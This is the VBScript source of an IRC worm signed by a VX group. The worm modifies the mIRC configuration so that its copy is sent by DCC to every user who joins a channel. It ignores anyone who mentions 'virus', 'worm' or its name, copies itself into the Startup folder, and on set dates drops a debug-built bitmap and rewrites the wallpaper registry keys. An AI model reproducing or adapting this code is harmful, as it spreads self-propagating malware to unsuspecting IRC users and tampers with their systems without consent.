'IRC-Worm.Dots.a
'by Raven [Metaphase VX Team]
'
'Seeing Gigabyte's Winscript worm named gum, I decided to
'code this up. No need for external files when you know
'batch ;) 
'This is a simple irc-worm that drops new wall paper on Windows 9.x.
'Sorry its cheezy just showing it can be done :)
'
'Specal thanks to Knowdeth his help with this worm
'Greetz to Tally, Sinixstar, Sblip, jackie twoflower, foxz and zulu
'
On Error Resume Next
Dim iniM, MakeScript, BatFile, DropMe
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")
Parent = Wscript.ScriptFullName
Set iniM = FSO.OpenTextFile("c:\mirc\mirc.ini", ForAppending, True)
      iniM.WriteLine "[rfiles]"
      iniM.WriteLine "n100=script.ini"
      iniM.Close
Set MakeScript = FSO.CreateTextFile("c:\mirc\script.ini", True)
  MakeScript.WriteLine "[script]"
  MakeScript.WriteLine "n0; IRC-Worm.Dots.a by Raven [Metaphase VX Team]"
  MakeScript.WriteLine "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
  MakeScript.WriteLine "n2=  /dcc send $nick c:\WINDOWS\system\dots.vbs"
  MakeScript.WriteLine "n3=}"
  MakeScript.WriteLine "n4="
  MakeScript.WriteLine "n5=;ON 1:PART:#:{ /if ( $nick == $me ) { halt }"
  MakeScript.WriteLine "n6=/dcc send $nick c:\WINDOWS\system\dots.vbs"
  MakeScript.WriteLine "n7=}"
  MakeScript.WriteLine "n8="
  MakeScript.WriteLine "n9=on 1:TEXT:*script.ini*:#:/.ignore $nick"
  MakeScript.WriteLine "n10=on 1:TEXT:*script.ini*:?:/.ignore $nick"
  MakeScript.WriteLine "n11=on 1:TEXT:*virus*:#:/.ignore $nick"
  MakeScript.WriteLine "n12=on 1:TEXT:*virus*:?:/.ignore $nick"
  MakeScript.WriteLine "n13=on 1:TEXT:*worm*:#:/.ignore $nick"
  MakeScript.WriteLine "n14=on 1:TEXT:*worm*:?:/.ignore $nick"
  MakeScript.WriteLine "n15=on 1:TEXT:*dots*:#:/.ignore $nick"
  MakeScript.WriteLine "n16=on 1:TEXT:*dots*:?:/.ignore $nick"
  MakeScript.WriteLine "n17=on 1:QUIT:#:/msg $chan Her Gift in pain, her pain was life."
  MakeScript.Close
FSO.CopyFile Parent, "c:\WINDOWS\system\dots.vbs"
FSO.CopyFile Parent, "c:\WINDOWS\Start Menu\Programs\StartUp\Startup§.vbs"
If Day(Now()) = 1 or Day(Now()) = 5 or Day(Now()) = 10 or Day(Now()) = 15 or Day(Now()) = 20 or Day(Now()) = 25  Then
  Set DropMe = FSO.CreateTextFile("c:\Windows\dots.dll", 2, False)
      DropMe.WriteLine ""
      DropMe.WriteLine "N DOT.BMP"
      DropMe.WriteLine "E 0100 42 4D F6 00 00 00 00 00 00 00 76 00 00 00 28 00"
      DropMe.WriteLine "E 0110 00 00 10 00 00 00 10 00 00 00 01 00 04 00 00 00"
      DropMe.WriteLine "E 0120 00 00 80 00 00 00 00 00 00 00 00 00 00 00 10 00"
      DropMe.WriteLine "E 0130 00 00 10 00 00 00 FF FF 84 00 00 00 FF 00 FF FF"
      DropMe.WriteLine "E 0140 FF 00 FF FF FF 00 FF FF FF 00 FF FF FF 00 FF FF"
      DropMe.WriteLine "E 0150 FF 00 FF FF FF 00 FF FF FF 00 FF FF FF 00 FF FF"
      DropMe.WriteLine "E 0160 FF 00 FF FF FF 00 FF FF FF 00 FF FF FF 00 FF FF"
      DropMe.WriteLine "E 0170 FF 00 FF FF FF 00 22 22 22 22 22 22 21 01 22 21"
      DropMe.WriteLine "E 0180 11 22 22 22 22 10 22 11 11 12 22 22 21 21 22 11"
      DropMe.WriteLine "E 0190 11 12 22 22 12 22 22 11 11 12 22 21 22 22 22 21"
      DropMe.WriteLine "E 01A0 11 22 22 12 22 22 22 22 22 22 21 22 22 22 22 22"
      DropMe.WriteLine "E 01B0 22 22 12 22 22 22 22 22 22 21 22 22 22 22 22 22"
      DropMe.WriteLine "E 01C0 22 12 22 22 22 22 22 22 21 22 22 11 12 22 22 22"
      DropMe.WriteLine "E 01D0 12 22 21 11 11 22 22 21 22 22 21 11 11 22 12 12"
      DropMe.WriteLine "E 01E0 22 22 21 11 11 22 01 22 22 22 22 11 12 22 10 12"
      DropMe.WriteLine "E 01F0 22 22 22 22 22 22"
      DropMe.WriteLine "RCX"
      DropMe.WriteLine "F6"
      DropMe.WriteLine "W"
      DropMe.WriteLine "Q"
      DropMe.WriteLine ""
      DropMe.Close
      Set BatFile = FSO.CreateTextFile("c:\Windows\WinStart.bat", 2, False)
      BatFile.WriteLine ""
      BatFile.WriteLine "@echo off"
      BatFile.WriteLine "debug < c:\windows\dots.dll > nul"
      BatFile.WriteLine ""
      BatFile.Close
 WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\Wallpaper", "C:\WINDOWS\Dot.BMP"
 WshShell.RegWrite "HKEY_CURRENT_USER\Control Panel\desktop\TileWallpaper", "1"
End If
'Time to go------->
